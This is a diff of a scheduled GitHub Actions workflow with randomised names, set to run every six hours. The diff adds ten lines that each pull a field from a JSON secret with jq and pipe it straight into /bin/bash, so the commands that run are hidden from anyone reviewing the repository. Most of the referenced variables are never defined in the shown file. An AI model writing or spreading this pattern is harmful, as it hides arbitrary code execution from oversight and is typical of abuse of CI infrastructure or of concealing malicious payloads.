@@ -3,21 +3,26 @@ name: wangtianyiy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
+    - cron: '33 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangtianyiy
         env:
-          liy12850: ${{ secrets.liy12850 }}
+          ru72: ${{ secrets.ru72 }}
         run: |
-          echo $liy12850 | jq -r .heie326 | /bin/bash
-          echo $uppyz4439 | jq -r .qwdfx0 | /bin/bash
-          echo $knu803 | jq -r .hejer120 | /bin/bash
-          echo $sp834 | jq -r .mtdof1017 | /bin/bash
-          echo $pskf6034 | jq -r .xac45 | /bin/bash
-          echo $yyumt014 | jq -r .sm964 | /bin/bash
+          echo $ru72 | jq -r .xxhmo30 | /bin/bash
+          echo $gsvc88 | jq -r .yzab52180 | /bin/bash
+          echo $h005 | jq -r .v9 | /bin/bash
+          echo $bp50279 | jq -r .k59841 | /bin/bash
+          echo $w883 | jq -r .rjbt7681 | /bin/bash
+          echo $t1092 | jq -r .fcvn75264 | /bin/bash
+          echo $kzh48 | jq -r .isnj6296 | /bin/bash
+          echo $wlkki9 | jq -r .m44 | /bin/bash
+          echo $uu46 | jq -r .ugvt4 | /bin/bash
+          echo $kik630 | jq -r .lr652 | /bin/bash
 
